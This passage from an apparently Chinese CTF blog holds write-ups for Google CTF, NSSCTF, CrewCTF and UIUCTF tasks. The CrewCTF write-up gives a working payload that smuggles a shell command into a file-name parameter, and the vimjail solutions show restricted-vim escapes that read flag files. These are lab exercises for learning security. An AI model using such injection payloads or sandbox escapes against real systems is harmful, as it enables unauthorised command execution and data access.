class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>]) || !<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$username</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;username&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$password</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$username</span>) || !<span class=\"title function_ invoke__\">is_string</span>(<span class=\"variable\">$password</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Please provide username and password as string&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$tier</span> = <span class=\"title function_ invoke__\">getUserTier</span>(<span class=\"variable\">$username</span>, <span class=\"variable\">$password</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$tier</span> === <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Invalid credentials&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$response</span> = <span class=\"string\">&quot;Login successful. Welcome &quot;</span> . <span class=\"title function_ invoke__\">htmlspecialchars</span>(<span class=\"variable\">$username</span>) . <span class=\"string\">&quot;.&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$tier</span> === <span class=\"string\">&quot;gold&quot;</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$response</span> .= <span class=\"string\">&quot; &quot;</span> . <span class=\"title function_ invoke__\">getenv</span>(<span class=\"string\">&quot;FLAG&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$response</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过代码分析，在php的服务上，只要让<code>tier=gold</code>就输出flag。</p>\n<p>可以在注册账号的时候传两个tier。</p>\n<p>flask识别第一个tier，php识别第二个tier，注册完后在php服务登录得到falg。</p>\n<p>其他的太难了，看都看不懂</p>\n<p><a href=\"http://blog.xmcve.com/2023/06/26/Google-CTF-2023-Writeup/\">http://blog.xmcve.com/2023/06/26/Google-CTF-2023-Writeup/</a></p>\n<p>可以看这个</p>\n","categories":["ctf"],"tags":["ctf"]},{"title":"NSSCTF MISC刷题","url":"/2023/01/24/NSSCTF-MISC%E5%88%B7%E9%A2%98/","content":"<h1 id=\"SWPUCTF-2021-新生赛-我的银行卡密码\"><a href=\"#SWPUCTF-2021-新生赛-我的银行卡密码\" class=\"headerlink\" title=\"[SWPUCTF 2021 新生赛]我的银行卡密码\"></a>[SWPUCTF 2021 新生赛]我的银行卡密码</h1><p><img src=\"/pic/%E6%88%91%E7%9A%84%E9%93%B6%E8%A1%8C%E5%8D%A1%E5%AF%86%E7%A0%81.png\"><br>压缩包有密码，而且是6位数。用ARCHPR破解，密码是<code>768521</code>。</p>\n<span id=\"more\"></span>\n<p>解压之后是一个md文件<br><img src=\"/pic/pwd.png\"><br>直接就懵了，看别人的wp后发现是用手机的九宫格解密的，还是写的少，涨知识了。<br>解出来之后是<code>YLOPJOGJVOCCYNMZYPGXGPOGJDVIGATBASH</code><br>后面的<code>ATBASH</code>就是提示<br>将<code>YLOPJOGJVOCCYNMZYPGXGPOGJDVIG</code>进行ATBASH解密，得到<code>BOLKQLTQELXXBMNABKTCTKLTQWERT</code>，后面的<code>QWERT</code>就是QWERT加密，也是个提示。<br>将<code>BOLKQLTQELXXBMNABKTCTKLT</code>进行QWERT解密，得到<code>XISRASEACSUUXZYKXREVERSE</code>,后面的reverse还是个提示得到<code>XKYZXUUSCAESARSIX</code>,caesar six也是个提示凯撒密码6，得到<code>RESTROOM</code>，最后在RESERVE一下<code>NSSCTF&#123;moortser&#125;</code>就是flag。</p>\n<h1 id=\"SWPU-2019-漂流记的马里奥\"><a href=\"#SWPU-2019-漂流记的马里奥\" class=\"headerlink\" title=\"[SWPU 2019]漂流记的马里奥\"></a>[SWPU 2019]漂流记的马里奥</h1><p>点开exe文件出现一个1.txt<br><img src=\"/pic/maliao.png\"><br>提示是ntfs，可以用<code>NtfsStreamsEditor2</code><br>或者<br>膜拜xenny大佬<br>cmd转到文件地址，命令行notepad 1.txt:flag.txt<br>最后的flag是<code>NSSCTF&#123;ddg_is_cute&#125;</code></p>\n<h1 id=\"SWPUCTF-2021-新生赛-gif好像有点大\"><a href=\"#SWPUCTF-2021-新生赛-gif好像有点大\" class=\"headerlink\" title=\"[SWPUCTF 2021 新生赛]gif好像有点大\"></a>[SWPUCTF 2021 新生赛]gif好像有点大</h1><p>下载文件后是个GIF图，用<code>STEG SOLVE</code>打开，在第562帧的时候有一个二维码，扫码就是flag <code>NSSCTF&#123;The_G1F_ls_T00_b1g&#125;</code></p>\n<h1 id=\"HUBUCTF-2022-新生赛-最简单的misc\"><a href=\"#HUBUCTF-2022-新生赛-最简单的misc\" class=\"headerlink\" title=\"[HUBUCTF 2022 新生赛]最简单的misc\"></a>[HUBUCTF 2022 新生赛]最简单的misc</h1><p>用<code>stegsolve</code>打开，LSB隐写，得到一个二维码，然后扫码之后就是flag:<code>NSSCTF&#123;aacc4238460996f0178c18d7637c9dd5&#125;</code></p>\n<p>唉！misc题写的恶心，就是跟作者对脑电波嘛。</p>\n","categories":["MISC","NSSCTF","刷题"],"tags":["刷题","MISC","NSSCTF"]},{"title":"CrewCTF","url":"/2023/07/11/CrewCTF/","content":"<h1 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h1><h2 id=\"sequence-gallery\"><a href=\"#sequence-gallery\" class=\"headerlink\" title=\"sequence_gallery\"></a>sequence_gallery</h2><p>下载附件</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#main.py</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> sqlite3</span><br><span class=\"line\"><span class=\"keyword\">import</span> subprocess</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request, render_template</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.get(<span class=\"params\"><span class=\"string\">&#x27;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">\tsequence = request.args.get(<span class=\"string\">&#x27;sequence&#x27;</span>, <span class=\"literal\">None</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> sequence <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;index.html&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\tscript_file = os.path.basename(sequence + <span class=\"string\">&#x27;.dc&#x27;</span>) <span class=\"comment\">#构造脚本名,将sequence和.dc字符串连接起来，并获取路径中的文件名部分。</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"string\">&#x27; &#x27;</span> <span class=\"keyword\">in</span> script_file <span class=\"keyword\">or</span> <span class=\"string\">&#x27;flag&#x27;</span> <span class=\"keyword\">in</span> script_file:</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"string\">&#x27;:(&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tproc = subprocess.run(     <span class=\"comment\">#运行dc命令</span></span><br><span class=\"line\">\t\t[<span class=\"string\">&#x27;dc&#x27;</span>, script_file], </span><br><span class=\"line\">\t\tcapture_output=<span class=\"literal\">True</span>,</span><br><span class=\"line\">\t\ttext=<span class=\"literal\">True</span>,</span><br><span class=\"line\">\t\ttimeout=<span class=\"number\">1</span>,</span><br><span class=\"line\">\t)</span><br><span class=\"line\">\toutput = proc.stdout</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;index.html&#x27;</span>, output=output)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">\tapp.run(host=<span class=\"string\">&#x27;0.0.0.0&#x27;</span>, port=<span class=\"number\">8080</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, capture_output=False, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None, text=None, env=None, universal_newlines=None)</span><br><span class=\"line\"></span><br><span class=\"line\">args：表示要执行的命令。必须是一个字符串，字符串参数列表。</span><br><span class=\"line\">stdin、stdout 和 stderr：子进程的标准输入、输出和错误。其值可以是 subprocess.PIPE、subprocess.DEVNULL、一个已经存在的文件描述符、已经打开的文件对象或者 None。subprocess.PIPE 表示为子进程创建新的管道。subprocess.DEVNULL 表示使用 os.devnull。默认使用的是 None，表示什么都不做。另外，stderr 可以合并到 stdout 里一起输出。</span><br><span class=\"line\">timeout：设置命令超时时间。如果命令执行时间超时，子进程将被杀死，并弹出 TimeoutExpired 异常。</span><br><span class=\"line\">check：如果该参数设置为 True，并且进程退出状态码不是 0，则弹 出 CalledProcessError 异常。</span><br><span class=\"line\">encoding: 如果指定了该参数，则 stdin、stdout 和 stderr 可以接收字符串数据，并以该编码方式编码。否则只接收 bytes 类型的数据。</span><br><span class=\"line\">shell：如果该参数为 True，将通过操作系统的 shell 执行指定的命令。</span><br></pre></td></tr></table></figure>\n\n<p>在<code>subprocess.run()</code>中<code>shell</code>没等于<code>TRUE</code>但是容易受到参数的影响</p>\n<p><img src=\"/pic/CrewCTF/web1.png\"></p>\n<p>在kali里用man命令看dc的文档</p>\n<p><img src=\"/pic/CrewCTF/web1.1.png\"></p>\n<p>用<code>-e</code>和<code>!</code>可以执行命令,空格被过滤了，用其他符号绕过，在最后需要加上<code>%0a</code>表示输入了ENTER</p>\n<p>payload:<code>?sequence=-e$&#123;IFS&#125;!cat$&#123;IFS&#125;*.txt%0A</code></p>\n<p>得到flag:<code>crew&#123;10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx&#125; </code></p>\n<p>放到kali里用dc命令转换为真实的flag</p>\n<p><img src=\"/pic/CrewCTF/web1.2.png\"></p>\n","categories":["ctf"],"tags":["ctf"]},{"title":"UIUCTF2023","url":"/2023/07/04/UIUCTF023/","content":"<h1 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h1><h2 id=\"vimjail1\"><a href=\"#vimjail1\" class=\"headerlink\" title=\"vimjail1\"></a>vimjail1</h2><p>这道题一连接就是插入模式，想办法退出插入模式.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#entry.sh</span><br><span class=\"line\">#!/usr/bin/env sh</span><br><span class=\"line\"></span><br><span class=\"line\">chmod -r /flag.txt</span><br><span class=\"line\"></span><br><span class=\"line\">vim -R -M -Z -u /home/user/vimrc</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>以只读、文本不可修改、限制模式、启动并且用<code>/home/user/vimrc</code>替代了原有的.vimrc</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#vimrc</span><br><span class=\"line\">set nocompatible</span><br><span class=\"line\">set insertmode</span><br><span class=\"line\"># 禁用了兼容模式，并且默认启动插入模式</span><br><span class=\"line\">inoremap &lt;c-o&gt; nope</span><br><span class=\"line\">inoremap &lt;c-l&gt; nope</span><br><span class=\"line\">inoremap &lt;c-z&gt; nope</span><br><span class=\"line\">inoremap &lt;c-\\&gt;&lt;c-n&gt; nope</span><br><span class=\"line\"># 将这些组合键转换为插入单词nope</span><br></pre></td></tr></table></figure>\n\n<p>但是可以按两次<code>ctrl+\\</code>再按一次<code>ctrl+n</code>来绕过，然后用<code>:e</code>来读取flag。</p>\n<p><code>:e</code>表示编辑一个文件</p>\n<p><img src=\"/pic/uiu/vim1.png\"></p>\n<h2 id=\"vimjail2\"><a href=\"#vimjail2\" class=\"headerlink\" title=\"vimjail2\"></a>vimjail2</h2><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#entry.sh</span></span><br><span class=\"line\"><span class=\"comment\">#!/usr/bin/env sh</span></span><br><span class=\"line\"></span><br><span class=\"line\">vim -R -M -Z -u /home/user/vimrc -i /home/user/viminfo</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> /flag.txt</span><br></pre></td></tr></table></figure>\n\n<p>以只读模式、文本不可修改、限制模式启动vim，替换了原有的vimrc和viminfo</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#vimrc</span><br><span class=\"line\">set nocompatible</span><br><span class=\"line\">set insertmode</span><br><span class=\"line\"></span><br><span class=\"line\">inoremap &lt;c-o&gt; nope</span><br><span class=\"line\">inoremap &lt;c-l&gt; nope</span><br><span class=\"line\">inoremap &lt;c-z&gt; nope</span><br><span class=\"line\">inoremap &lt;c-\\&gt;&lt;c-n&gt; nope</span><br><span class=\"line\"></span><br><span class=\"line\">cnoremap a _</span><br><span class=\"line\">cnoremap b _</span><br><span class=\"line\">cnoremap c _</span><br><span class=\"line\">cnoremap d _</span><br><span class=\"line\">cnoremap e _</span><br><span class=\"line\">cnoremap f _</span><br><span class=\"line\">cnoremap g _</span><br><span class=\"line\">cnoremap h _</span><br><span class=\"line\">cnoremap i _</span><br><span class=\"line\">cnoremap j _</span><br><span class=\"line\">cnoremap k _</span><br><span class=\"line\">cnoremap l _</span><br><span class=\"line\">cnoremap m _</span><br><span class=\"line\">cnoremap n _</span><br><span class=\"line\">cnoremap o _</span><br><span class=\"line\">cnoremap p _</span><br><span class=\"line\">cnoremap r _</span><br><span class=\"line\">cnoremap s _</span><br><span class=\"line\">cnoremap t _</span><br><span class=\"line\">cnoremap u _</span><br><span class=\"line\">cnoremap v _</span><br><span class=\"line\">cnoremap w _</span><br><span class=\"line\">cnoremap x _</span><br><span class=\"line\">cnoremap y _</span><br><span class=\"line\">cnoremap z _</span><br><span class=\"line\">cnoremap ! _</span><br><span class=\"line\">cnoremap @ _</span><br><span class=\"line\">cnoremap # _</span><br><span class=\"line\">cnoremap $ _</span><br><span class=\"line\">cnoremap % _</span><br><span class=\"line\">cnoremap ^ _</span><br><span class=\"line\">cnoremap &amp; _</span><br><span class=\"line\">cnoremap * _</span><br><span class=\"line\">cnoremap - _</span><br><span class=\"line\">cnoremap + _</span><br><span class=\"line\">cnoremap = _</span><br><span class=\"line\">cnoremap ` _</span><br><span class=\"line\">cnoremap ~ _</span><br><span class=\"line\">cnoremap &#123; _</span><br><span class=\"line\">cnoremap &#125; _</span><br><span class=\"line\">cnoremap [ _</span><br><span class=\"line\">cnoremap ] _</span><br><span class=\"line\">cnoremap \\| _</span><br><span class=\"line\">cnoremap \\ _</span><br><span class=\"line\">cnoremap ; _</span><br><span class=\"line\">cnoremap &lt; _</span><br><span class=\"line\">cnoremap &gt; _</span><br><span class=\"line\">cnoremap , _</span><br><span class=\"line\">cnoremap . _</span><br><span class=\"line\">cnoremap / _</span><br><span class=\"line\">cnoremap ? _</span><br></pre></td></tr></table></figure>\n\n<p>将所有字符都转换成了下划线，绕过方式还是两次<code>ctrl+\\</code>+<code>ctrl+n</code>，entry.sh中最后有一个<code>cat /flag</code>,这意味着退出vim后会打印出flag.</p>\n<p><code>:q</code>即可。</p>\n<h2 id=\"Corny-Kernel\"><a href=\"#Corny-Kernel\" class=\"headerlink\" title=\"Corny Kernel\"></a>Corny Kernel</h2><p>附件给了一个c文件</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> pr_fmt(fmt) KBUILD_MODNAME <span class=\"string\">&quot;: &quot;</span> fmt</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/module.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/init.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/kernel.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"type\">const</span> <span class=\"type\">char</span> *flag1, *flag2;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __init <span class=\"title function_\">pwny_init</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tpr_alert(<span class=\"string\">&quot;%s\\n&quot;</span>, flag1);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> __exit <span class=\"title function_\">pwny_exit</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tpr_info(<span class=\"string\">&quot;%s\\n&quot;</span>, flag2);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">module_init(pwny_init);</span><br><span class=\"line\">module_exit(pwny_exit);</span><br><span class=\"line\"></span><br><span class=\"line\">MODULE_AUTHOR(<span class=\"string\">&quot;Nitya&quot;</span>);</span><br><span class=\"line\">MODULE_DESCRIPTION(<span class=\"string\">&quot;UIUCTF23&quot;</span>);</span><br><span class=\"line\">MODULE_LICENSE(<span class=\"string\">&quot;GPL&quot;</span>);</span><br><span class=\"line\">MODULE_VERSION(<span class=\"string\">&quot;0.1&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>下面的代码的意思是当加载模块的时候输出第一段flag</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __init <span class=\"title function_\">pwny_init</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tpr_alert(<span class=\"string\">&quot;%s\\n&quot;</span>, flag1);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">module_init(pwny_init); #这行代码将 pwny_init 函数注册为模块的初始化函数。在模块加载时，该函数将被调用。</span><br></pre></td></tr></table></figure>\n\n<p>首先用<code>gzip -d pwnymodule.ko.gz</code>，然后用<code>insmod pwnymodule.ko</code>加载这个模块，加载完成后会输出第一串flag。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> __exit <span class=\"title function_\">pwny_exit</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tpr_info(<span class=\"string\">&quot;%s\\n&quot;</span>, flag2);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">module_exit(pwny_exit);   #这行代码将 pwny_exit 函数注册为模块的退出函数。在模块被卸载时，该函数将被调用来执行清理操作。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这一串代码的意思是这个模块在被卸载的时候输出第二段flag,用<code>rmmod pwnymodule.ko</code>这个卸载模块,然后用<code>dmesg</code>输出内核的信息，在最后会输出两段flag。</p>\n<h2 id=\"vimjail1-5\"><a href=\"#vimjail1-5\" class=\"headerlink\" title=\"vimjail1.5\"></a>vimjail1.5</h2><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#entry.sh</span></span><br><span class=\"line\"><span class=\"comment\">#!/usr/bin/env sh</span></span><br><span class=\"line\"></span><br><span class=\"line\">vim -R -M -Z -u /home/user/vimrc</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#vimrc</span><br><span class=\"line\">set nocompatible</span><br><span class=\"line\">set insertmode</span><br><span class=\"line\"></span><br><span class=\"line\">inoremap &lt;c-o&gt; nope</span><br><span class=\"line\">inoremap &lt;c-l&gt; nope</span><br><span class=\"line\">inoremap &lt;c-z&gt; nope</span><br><span class=\"line\">inoremap &lt;c-\\&gt; nope</span><br></pre></td></tr></table></figure>\n\n<p>别的没变，但是之前的方法没用了，用<code>ctrl+r</code>这个用于执行撤销和重做操作。然后用<code>=execute(readfile(&#39;flag.txt&#39;))</code></p>\n<p><code>=</code> 是用于执行表达式的命令。<code>execute()</code>：<code>execute()</code> 函数用于执行 Vim 命令。<code>readfile(&#39;flag.txt&#39;)</code>：使用 Vim 的内置函数 <code>readfile()</code> 读取名为 <code>flag.txt</code> 的文件内容，并返回一个包含文件内容的列表。就是将flag.txt里面的内容变成命令执行,然后就会报错</p>\n<p><img src=\"/pic/uiu/vim1.5.png\"></p>\n<p>或者，用<code>=execute(&#39;:e flag.txt&#39;)</code>然后按两次回车。</p>\n<h2 id=\"vimjail2-5\"><a href=\"#vimjail2-5\" class=\"headerlink\" title=\"vimjail2.5\"></a>vimjail2.5</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#vimrc</span><br><span class=\"line\">set nocompatible</span><br><span class=\"line\">set insertmode</span><br><span class=\"line\"></span><br><span class=\"line\">inoremap &lt;c-o&gt; nope</span><br><span class=\"line\">inoremap &lt;c-l&gt; nope</span><br><span class=\"line\">inoremap &lt;c-z&gt; nope</span><br><span class=\"line\">inoremap &lt;c-\\&gt; nope</span><br><span class=\"line\"></span><br><span class=\"line\">cnoremap a _</span><br><span class=\"line\">cnoremap b _</span><br><span class=\"line\">cnoremap c _</span><br><span class=\"line\">cnoremap d _</span><br><span class=\"line\">cnoremap e _</span><br><span class=\"line\">cnoremap f _</span><br><span class=\"line\">cnoremap g _</span><br><span class=\"line\">cnoremap h _</span><br><span class=\"line\">cnoremap i _</span><br><span class=\"line\">cnoremap j _</span><br><span class=\"line\">cnoremap k _</span><br><span class=\"line\">cnoremap l _</span><br><span class=\"line\">cnoremap m _</span><br><span class=\"line\">cnoremap n _</span><br><span class=\"line\">cnoremap o _</span><br><span class=\"line\">cnoremap p _</span><br><span class=\"line\">cnoremap r _</span><br><span class=\"line\">cnoremap s _</span><br><span class=\"line\">cnoremap t _</span><br><span class=\"line\">cnoremap u _</span><br><span class=\"line\">cnoremap v _</span><br><span class=\"line\">cnoremap w _</span><br><span class=\"line\">cnoremap x _</span><br><span class=\"line\">cnoremap y _</span><br><span class=\"line\">cnoremap z _</span><br><span class=\"line\">cnoremap ! _</span><br><span class=\"line\">cnoremap @ _</span><br><span class=\"line\">cnoremap # _</span><br><span class=\"line\">cnoremap $ _</span><br><span class=\"line\">cnoremap % _</span><br><span class=\"line\">cnoremap ^ _</span><br><span class=\"line\">cnoremap &amp; _</span><br><span class=\"line\">cnoremap * _</span><br><span class=\"line\">cnoremap - _</span><br><span class=\"line\">cnoremap + _</span><br><span class=\"line\">cnoremap = _</span><br><span class=\"line\">cnoremap ` _</span><br><span class=\"line\">cnoremap ~ _</span><br><span class=\"line\">cnoremap &#123; _</span><br><span class=\"line\">cnoremap &#125; _</span><br><span class=\"line\">cnoremap [ _</span><br><span class=\"line\">cnoremap ] _</span><br><span class=\"line\">cnoremap \\| _</span><br><span class=\"line\">cnoremap \\ _</span><br><span class=\"line\">cnoremap ; _</span><br><span class=\"line\">cnoremap &lt; _</span><br><span class=\"line\">cnoremap &gt; _</span><br><span class=\"line\">cnoremap , _</span><br><span class=\"line\">cnoremap . _</span><br><span class=\"line\">cnoremap / _</span><br><span class=\"line\">cnoremap ? _</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这个只能输入<code>:q</code>，方法基本上差不多，还是<code>ctrl+r</code>然后<code>=</code>,按<code>TAB</code>键可以补全内置代码，然后找到<code>execute</code>，最后的命令是<code>execute(&quot;:q&quot;)</code>，后会输出flag。</p>\n<h1 id=\"crypto\"><a href=\"#crypto\" class=\"headerlink\" title=\"crypto\"></a>crypto</h1><h2 id=\"Three-Time-Pad\"><a href=\"#Three-Time-Pad\" class=\"headerlink\" title=\"Three-Time Pad\"></a>Three-Time Pad</h2><p><a href=\"http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/\">http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/</a></p>\n<p>看这篇博客，用他的脚本可以解出这道题</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span></span><br><span class=\"line\"><span class=\"comment\"># @author intrd - http://dann.com.br/ </span></span><br><span class=\"line\"><span class=\"comment\"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> collections</span><br><span class=\"line\"><span class=\"keyword\">import</span> sets, sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span></span><br><span class=\"line\">c1 = <span class=\"string\">&quot;14f5f95b4a252948a8aef177d6c92d82e3016362bd7463f41f40a00ad9e0ccad911b959ef8dfad5f1cc4481ecb64&quot;</span></span><br><span class=\"line\">c2 = <span class=\"string\">&quot;06e2f65a4c256d0ba8ada164cecd329cae436069f83476e91757e91bd4a4cce2c60a8f9aac8cb14210d55253cd787c0f6a&quot;</span></span><br><span class=\"line\">c3 = <span class=\"string\">&quot;03f9ea574c267249b2b1ef5d91cd3c99904a3f75873871e94157df0fcbb5d1eab94f9386&quot;</span></span><br><span class=\"line\">ciphers = [c1, c2, c3]</span><br><span class=\"line\"><span class=\"comment\"># The target ciphertext we want to crack</span></span><br><span class=\"line\">target_cipher = <span class=\"string\">&quot;03f9ea574c267249b2b1ef5d91cd3c99904a3f75873871e94157df0fcbb5d1eab94f9386&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># XORs two string</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">strxor</span>(<span class=\"params\">a, b</span>):     <span class=\"comment\"># xor two strings (trims the longer input)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;</span>.join([<span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(x) ^ <span class=\"built_in\">ord</span>(y)) <span class=\"keyword\">for</span> (x, y) <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(a, b)])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># To store the final key</span></span><br><span class=\"line\">final_key = [<span class=\"literal\">None</span>]*<span class=\"number\">150</span></span><br><span class=\"line\"><span class=\"comment\"># To store the positions we know are broken</span></span><br><span class=\"line\">known_key_positions = <span class=\"built_in\">set</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># For each ciphertext</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> current_index, ciphertext <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(ciphers):</span><br><span class=\"line\">\tcounter = collections.Counter()</span><br><span class=\"line\">\t<span class=\"comment\"># for each other ciphertext</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> index, ciphertext2 <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(ciphers):</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> current_index != index: <span class=\"comment\"># don&#x27;t xor a ciphertext with itself</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> indexOfChar, char <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(strxor(ciphertext.decode(<span class=\"string\">&#x27;hex&#x27;</span>), ciphertext2.decode(<span class=\"string\">&#x27;hex&#x27;</span>))): <span class=\"comment\"># Xor the two ciphertexts</span></span><br><span class=\"line\">\t\t\t\t<span class=\"comment\"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#x27;t know which one)</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> char <span class=\"keyword\">in</span> string.printable <span 